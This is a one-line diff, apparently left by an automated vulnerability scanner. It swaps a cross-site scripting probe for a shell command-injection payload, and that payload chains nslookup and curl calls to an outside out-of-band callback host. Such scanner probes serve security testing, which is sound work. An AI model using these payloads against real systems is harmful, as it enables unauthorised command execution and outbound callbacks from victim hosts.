@@ -1,1 +1,1 @@
-'"()&%<zzz><ScRiPt >pgEC(9947)</ScRiPt>
+;(nslookup -q=cname hitwyvtrjjobm041b3.bxss.me||curl hitwyvtrjjobm041b3.bxss.me)|(nslookup -q=cname hitwyvtrjjobm041b3.bxss.me||curl hitwyvtrjjobm041b3.bxss.me)&(nslookup -q=cname hitwyvtrjjobm041b3.bxss.me||curl hitwyvtrjjobm041b3.bxss.me)
